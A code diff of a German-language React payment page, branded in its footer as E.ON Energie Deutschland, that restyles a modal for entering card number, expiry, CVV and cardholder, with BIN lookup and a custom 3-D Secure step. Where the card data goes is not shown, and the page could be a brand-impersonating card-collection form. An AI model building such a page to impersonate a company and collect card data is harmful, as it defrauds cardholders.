-        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center p-4 z-50 backdrop-blur-sm">
-          <div className="bg-white rounded-lg max-w-3xl w-full max-h-[90vh] overflow-y-auto shadow-2xl">
-            <div className="bg-gradient-to-r from-[#E20015] to-[#C00012] px-8 py-6">
-              <h2 className="text-3xl font-bold text-white">Zahlungsmethode hinzufügen</h2>
-              <p className="text-white/90 mt-2">Ihre Daten werden sicher verschlüsselt übertragen</p>
+        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-[60] p-4">
+          <div className="bg-white rounded-xl shadow-2xl w-full max-w-[600px] max-h-[90vh] overflow-y-auto">
+            <div className="bg-gradient-to-r from-[#E20015] to-[#C00012] px-6 sm:px-8 py-6 sm:py-7 flex items-center justify-between">
+              <h2 className="text-xl sm:text-2xl md:text-3xl font-bold text-white">Kreditkarte hinzufügen</h2>
+              <button
+                onClick={() => {
+                  setShowAddModal(false)
+                  resetForm()
+                }}
+                className="text-white/90 hover:text-white transition-colors"
+              >
+                <svg
+                  className="w-7 h-7 sm:w-8 sm:h-8"
+                  fill="none"
+                  stroke="currentColor"
+                  viewBox="0 0 24 24"
+                  strokeWidth="2"
+                >
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </button>
             </div>
 
-            <form onSubmit={handleAddPaymentMethod} className="p-8">
-              <div className="space-y-6">
-                {/* Reorganized form layout: Card Number (full width) → Expiry | CVV → Card Holder (full width) */}
+            <div className="p-6 sm:p-8 md:p-10">
+              <form onSubmit={handleAddPaymentMethod} className="space-y-6 sm:space-y-7">
                 <div>
-                  <label className="block text-sm font-bold text-gray-900 mb-2">Kartennummer *</label>
-                  <div className="relative">
-                    <input
-                      ref={cardNumberRef}
-                      type="text"
-                      inputMode="numeric"
-                      autoComplete="cc-number"
-                      placeholder="1234 5678 9012 3456"
-                      value={formData.card_number}
-                      onChange={(e) => handleCardNumberChange(e.target.value)}
-                      onPaste={handleCardNumberPaste}
-                      onKeyDown={(e) => handleKeyDown(e, expiryRef)}
-                      onFocus={() => setFocusedField("card_number")}
-                      onBlur={() => setFocusedField(null)}
-                      className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none transition-all ${
-                        errors.card_number
-                          ? "border-red-500 focus:border-red-600"
-                          : validFields.card_number
-                            ? "border-green-500 bg-green-50"
-                            : focusedField === "card_number"
-                              ? "border-[#E20015] ring-4 ring-[#E20015]/10"
-                              : "border-gray-300 focus:border-[#E20015]"
-                      }`}
-                      required
-                    />
-                    {isFetchingBin && (
-                      <div className="absolute inset-y-0 right-10 flex items-center pr-3 pointer-events-none">
-                        <svg className="animate-spin h-5 w-5 text-[#E20015]" viewBox="0 0 24 24">
-                          <circle
-                            className="opacity-25"
-                            cx="12"
-                            cy="12"
-                            r="10"
-                            stroke="currentColor"
-                            strokeWidth="4"
-                            fill="none"
-                          />
-                          <path
-                            className="opacity-75"
-                            fill="currentColor"
-                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                          />
-                        </svg>
-                      </div>
-                    )}
-                    {validFields.card_number && (
-                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
-                          <path d="M20 6L9 17l-5-5" />
-                        </svg>
-                      </div>
-                    )}
-                    {cardType && !isFetchingBin && (
-                      <div className="absolute right-10 top-1/2 -translate-y-1/2 flex items-center gap-2">
-                        <svg className="w-10 h-6" viewBox="0 0 48 32">
-                          {cardType === "visa" && (
-                            <text x="24" y="20" textAnchor="middle" className="text-xs font-bold fill-[#1A1F71]">
-                              VISA
-                            </text>
-                          )}
-                          {cardType === "mastercard" && (
-                            <>
-                              <circle cx="18" cy="16" r="10" fill="#EB001B" opacity="0.8" />
-                              <circle cx="30" cy="16" r="10" fill="#F79E1B" opacity="0.8" />
-                            </>
-                          )}
-                          {cardType === "amex" && (
-                            <text x="24" y="20" textAnchor="middle" className="text-xs font-bold fill-[#00AEEF]">
-                              AMEX
-                            </text>
-                          )}
-                          {cardType === "discover" && (
-                            <text x="24" y="20" textAnchor="middle" className="text-xs font-bold fill-[#FF6600]">
-                              DISCOVER
-                            </text>
-                          )}
-                        </svg>
-                      </div>
-                    )}
-                  </div>
-                  {errors.card_number && <p className="text-red-600 text-sm mt-1">{errors.card_number}</p>}
-                </div>
-
-                <div className="grid grid-cols-2 gap-6">
-                  <div>
-                    <label className="block text-sm font-bold text-gray-900 mb-2">Ablaufdatum *</label>
-                    <div className="relative">
-                      <input
-                        ref={expiryRef}
-                        type="text"
-                        inputMode="numeric"
-                        autoComplete="cc-exp"
-                        placeholder="MM/YY"
-                        value={expiryDisplay}
-                        onChange={(e) => handleExpiryChange(e.target.value)}
-                        onKeyDown={(e) => handleKeyDown(e, cvvRef)}
-                        onFocus={() => setFocusedField("expiry")}
-                        onBlur={() => setFocusedField(null)}
-                        maxLength={5}
-                        className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none transition-all ${
-                          errors.expiry
-                            ? "border-red-500 focus:border-red-600"
-                            : validFields.expiry
-                              ? "border-green-500 bg-green-50"
-                              : focusedField === "expiry"
-                                ? "border-[#E20015] ring-4 ring-[#E20015]/10"
-                                : "border-gray-300 focus:border-[#E20015]"
-                        }`}
-                        required
-                      />
-                      {validFields.expiry && (
-                        <div className="absolute right-3 top-1/2 -translate-y-1/2">
-                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
-                            <path d="M20 6L9 17l-5-5" />
-                          </svg>
-                        </div>
-                      )}
-                    </div>
-                    {errors.expiry && <p className="text-red-600 text-sm mt-1">{errors.expiry}</p>}
-                  </div>
-
-                  <div>
-                    <label className="block text-sm font-bold text-gray-900 mb-2 flex items-center gap-2">
-                      CVV *
-                      <button
-                        type="button"
-                        onMouseEnter={() => setShowCvvTooltip(true)}
-                        onMouseLeave={() => setShowCvvTooltip(false)}
-                        className="text-gray-400 hover:text-gray-600"
-                      >
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
-                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-4h-2V7h2v6z" />
-                        </svg>
-                      </button>
-                      {showCvvTooltip && (
-                        <div className="absolute z-10 bg-gray-900 text-white text-xs rounded-lg p-2 mt-1 w-48 -bottom-16 left-0">
-                          3-stelliger Code auf der Rückseite (4-stellig bei Amex)
-                        </div>
-                      )}
-                    </label>
-                    <div className="relative">
-                      <input
-                        ref={cvvRef}
-                        type="text"
-                        inputMode="numeric"
-                        autoComplete="cc-csc"
-                        placeholder={cardType === "amex" ? "••••" : "•••"}
-                        value={formData.cvv}
-                        onChange={(e) => handleCvvChange(e.target.value)}
-                        onKeyDown={(e) => handleKeyDown(e, cardHolderRef)}
-                        onFocus={() => setFocusedField("cvv")}
-                        onBlur={() => setFocusedField(null)}
-                        maxLength={cardType === "amex" ? 4 : 3}
-                        className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none transition-all ${
-                          errors.cvv
-                            ? "border-red-500 focus:border-red-600"
-                            : validFields.cvv
-                              ? "border-green-500 bg-green-50"
-                              : focusedField === "cvv"
-                                ? "border-[#E20015] ring-4 ring-[#E20015]/10"
-                                : "border-gray-300 focus:border-[#E20015]"
-                        }`}
-                        required
-                      />
-                      {validFields.cvv && (
-                        <div className="absolute right-3 top-1/2 -translate-y-1/2">
-                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
-                            <path d="M20 6L9 17l-5-5" />
-                          </svg>
-                        </div>
-                      )}
-                    </div>
-                    {errors.cvv && <p className="text-red-600 text-sm mt-1">{errors.cvv}</p>}
-                  </div>
-                </div>
-
-                <div>
-                  <label className="block text-sm font-bold text-gray-900 mb-2">Karteninhaber *</label>
-                  <div className="relative">
-                    <input
-                      ref={cardHolderRef}
-                      type="text"
-                      autoComplete="cc-name"
-                      placeholder="Max Mustermann"
-                      value={formData.card_holder}
-                      onChange={(e) => handleCardHolderChange(e.target.value)}
-                      onKeyDown={(e) => {
-                        if (e.key === "Enter" && isFormValid) {
-                          e.preventDefault()
-                          handleAddPaymentMethod(e as any)
-                        }
-                      }}
-                      onFocus={() => setFocusedField("card_holder")}
-                      onBlur={() => setFocusedField(null)}
-                      className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none transition-all uppercase ${
-                        errors.card_holder
-                          ? "border-red-500 focus:border-red-600"
-                          : validFields.card_holder
-                            ? "border-green-500 bg-green-50"
-                            : focusedField === "card_holder"
-                              ? "border-[#E20015] ring-4 ring-[#E20015]/10"
-                              : "border-gray-300 focus:border-[#E20015]"
-                      }`}
-                      required
-                    />
-                    {validFields.card_holder && (
-                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
-                          <path d="M20 6L9 17l-5-5" />
-                        </svg>
-                      </div>
-                    )}
-                  </div>
-                  {errors.card_holder && <p className="text-red-600 text-sm mt-1">{errors.card_holder}</p>}
-                </div>
-
-                <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-4 flex items-start gap-3">
-                  <svg
-                    width="24"
-                    height="24"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="#3B82F6"
-                    strokeWidth="2"
-                    className="flex-shrink-0"
-                  >
-                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                  </svg>
-                  <div>
-                    <p className="text-sm font-bold text-blue-900">Sichere Datenübertragung</p>
-                    <p className="text-xs text-blue-700 mt-1">
-                      Ihre Kartendaten werden verschlüsselt und sicher gespeichert
+                  <label className="block text-base sm:text-lg md:text-xl font-semibold text-gray-700 mb-3">
+                    Kartennummer <span className="text-red-500">*</span>
+                  </label>
+                  <input
+                    ref={cardNumberRef}
+                    type="text"
+                    value={formData.card_number}
+                    onChange={(e) => handleCardNumberChange(e.target.value)}
+                    onPaste={handleCardNumberPaste}
+                    onKeyDown={(e) => handleKeyDown(e, expiryRef)}
+                    placeholder="1234 5678 9012 3456"
+                    maxLength={19}
+                    className={`w-full px-4 sm:px-5 py-4 sm:py-5 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E20015]/20 transition-all ${
+                      errors.card_number
+                        ? "border-red-500"
+                        : validFields.card_number
+                          ? "border-green-500"
+                          : "border-gray-300 focus:border-[#E20015]"
+                    }`}
+                    required
+                  />
+                  {errors.card_number && <p className="mt-2 text-base sm:text-lg text-red-600">{errors.card_number}</p>}
+                  {binData && !errors.card_number && (
+                    <p className="mt-2 text-base sm:text-lg text-blue-600">
+                      {binData.bank?.name} • {binData.type}
                     </p>
+                  )}
+                </div>
+
+                <div className="grid grid-cols-2 gap-4 sm:gap-6">
+                  <div>
+                    <label className="block text-base sm:text-lg md:text-xl font-semibold text-gray-700 mb-3">
+                      Gültig bis <span className="text-red-500">*</span>
+                    </label>
+                    <input
+                      ref={expiryRef}
+                      type="text"
+                      value={expiryDisplay}
+                      onChange={(e) => handleExpiryChange(e.target.value)}
+                      onKeyDown={(e) => handleKeyDown(e, cvvRef)}
+                      placeholder="MM/JJ"
+                      maxLength={5}
+                      className={`w-full px-4 sm:px-5 py-4 sm:py-5 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E20015]/20 transition-all ${
+                        errors.expiry
+                          ? "border-red-500"
+                          : validFields.expiry
+                            ? "border-green-500"
+                            : "border-gray-300 focus:border-[#E20015]"
+                      }`}
+                      required
+                    />
+                    {errors.expiry && <p className="mt-2 text-base sm:text-lg text-red-600">{errors.expiry}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-base sm:text-lg md:text-xl font-semibold text-gray-700 mb-3">
+                      CVV <span className="text-red-500">*</span>
+                    </label>
+                    <input
+                      ref={cvvRef}
+                      type="text"
+                      value={formData.cvv}
+                      onChange={(e) => handleCvvChange(e.target.value)}
+                      onKeyDown={(e) => handleKeyDown(e, cardHolderRef)}
+                      placeholder="123"
+                      maxLength={4}
+                      className={`w-full px-4 sm:px-5 py-4 sm:py-5 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E20015]/20 transition-all ${
+                        errors.cvv
+                          ? "border-red-500"
+                          : validFields.cvv
+                            ? "border-green-500"
+                            : "border-gray-300 focus:border-[#E20015]"
+                      }`}
+                      required
+                    />
+                    {errors.cvv && <p className="mt-2 text-base sm:text-lg text-red-600">{errors.cvv}</p>}
                   </div>
                 </div>
-              </div>
 
-              <div className="flex gap-4 mt-8 pt-6 border-t border-gray-200">
-                <button
-                  type="submit"
-                  disabled={isSubmitting || isAddingCard || !isFormValid}
-                  className="flex-1 bg-[#E20015] hover:bg-[#C00012] text-white font-bold py-4 rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-                >
-                  {isAddingCard ? (
-                    <span className="flex items-center justify-center gap-2">
-                      <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
-                        <circle
-                          className="opacity-25"
-                          cx="12"
-                          cy="12"
-                          r="10"
-                          stroke="currentColor"
-                          strokeWidth="4"
-                          fill="none"
-                        />
-                        <path
-                          className="opacity-75"
-                          fill="currentColor"
-                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                        />
-                      </svg>
-                      Wird verarbeitet...
-                    </span>
-                  ) : isSubmitting ? (
-                    "Wird hinzugefügt..."
-                  ) : (
-                    "Zahlungsmethode hinzufügen"
-                  )}
-                </button>
-                <button
-                  type="button"
-                  onClick={() => {
-                    setShowAddModal(false)
-                    resetForm()
-                  }}
-                  disabled={isSubmitting || isAddingCard}
-                  className="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold py-4 rounded-lg transition-all disabled:opacity-50"
-                >
-                  Abbrechen
-                </button>
-              </div>
-            </form>
+                <div>
+                  <label className="block text-base sm:text-lg md:text-xl font-semibold text-gray-700 mb-3">
+                    Karteninhaber <span className="text-red-500">*</span>
+                  </label>
+                  <input
+                    ref={cardHolderRef}
+                    type="text"
+                    value={formData.card_holder}
+                    onChange={(e) => handleCardHolderChange(e.target.value)}
+                    placeholder="Max Mustermann"
+                    className={`w-full px-4 sm:px-5 py-4 sm:py-5 text-lg sm:text-xl md:text-2xl border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E20015]/20 transition-all ${
+                      validFields.card_holder ? "border-green-500" : "border-gray-300 focus:border-[#E20015]"
+                    }`}
+                    required
+                  />
+                </div>
+
+                <div className="bg-green-50 border border-green-200 rounded-lg p-4 sm:p-5">
+                  <p className="text-base sm:text-lg text-green-800">
+                    🔒 Ihre Daten werden sicher verschlüsselt übertragen
+                  </p>
+                </div>
+
+                <div className="flex gap-3 sm:gap-4 pt-2">
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setShowAddModal(false)
+                      resetForm()
+                    }}
+                    className="flex-1 px-5 sm:px-6 py-4 sm:py-5 text-base sm:text-lg md:text-xl border-2 border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-all font-semibold"
+                  >
+                    Abbrechen
+                  </button>
+                  <button
+                    type="submit"
+                    disabled={isSubmitting || !isFormValid}
+                    className="flex-1 px-5 sm:px-6 py-4 sm:py-5 text-base sm:text-lg md:text-xl bg-[#E20015] text-white rounded-lg hover:bg-[#C00012] transition-all font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
+                  >
+                    {isSubmitting ? "Wird hinzugefügt..." : "Hinzufügen"}
+                  </button>
+                </div>
+              </form>
+            </div>
           </div>
         </div>
       )}
 
       {showStripeLoading && (
-        <div className="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center z-50 backdrop-blur-md">
+        <div className="fixed inset-0 bg-white/30 flex items-center justify-center z-50 backdrop-blur-md">
           <div className="bg-white rounded-2xl max-w-md w-full shadow-2xl p-12">
             <div className="text-center">
               <div className="mb-8">
@@ -1417,7 +1567,7 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       )}
 
       {show3DSecureModal && (
-        <div className="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50 backdrop-blur-md">
+        <div className="fixed inset-0 bg-white/30 flex items-center justify-center p-4 z-50 backdrop-blur-md">
           <div className="bg-white rounded-2xl max-w-md w-full shadow-2xl overflow-hidden">
             {verificationStep === "loading" && (
               <div className="p-12 text-center">
@@ -1607,8 +1757,10 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
         </div>
       )}
 
-      <footer className="bg-white border-t border-gray-200 px-6 py-8">
-        <div className="max-w-7xl mx-auto text-center text-sm text-gray-600">
+      <footer
+        className={`bg-white border-t border-[#E0E0E0] px-8 py-10 transition-all duration-500 ${showSepaAlert ? "blur-sm" : ""}`}
+      >
+        <div className="max-w-[1400px] mx-auto text-center text-[1.4rem] text-[#999999]">
           <p>© 2025 E.ON Energie Deutschland GmbH</p>
         </div>
       </footer>
